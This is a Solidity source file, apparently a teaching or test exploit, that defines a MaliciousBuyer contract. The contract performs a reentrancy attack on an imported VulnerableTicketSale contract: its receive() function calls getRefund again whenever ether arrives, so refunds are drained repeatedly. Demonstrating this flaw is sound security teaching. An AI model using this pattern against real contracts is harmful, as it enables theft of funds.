// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

import "./VulnerableTicketSale.sol";

/// @notice
contract MaliciousBuyer {
    /// @notice
    VulnerableTicketSale private vulnerableContract;

    /// @notice
    uint256 private ticketsBought;

    /// @notice
    uint256 private receiveCalls;

    event Log(uint256 a, uint256 b);
    event Error(bytes err);

    /// @notice
    constructor(address payable vulnerableContractAddress) {
        vulnerableContract = VulnerableTicketSale(vulnerableContractAddress);
    }

    /// @notice
    function buyTickets(uint256 quantity) external payable {
        // emit Log(quantity, msg.value);
        // emit Balance(address(this).balance);
        vulnerableContract.buyTickets{value: msg.value}(quantity);
        ticketsBought = quantity;
        // emit Balance(address(this).balance);
    }

    /// @notice
    function getRefund(uint256 quantity) external {
        vulnerableContract.getRefund(quantity);
    }

    /// @notice
    receive() external payable {
        try vulnerableContract.getRefund(ticketsBought) {
            emit Log(msg.value, address(this).balance);
        }
        catch (bytes memory error) {
            emit Error(error);
        }
    }
}
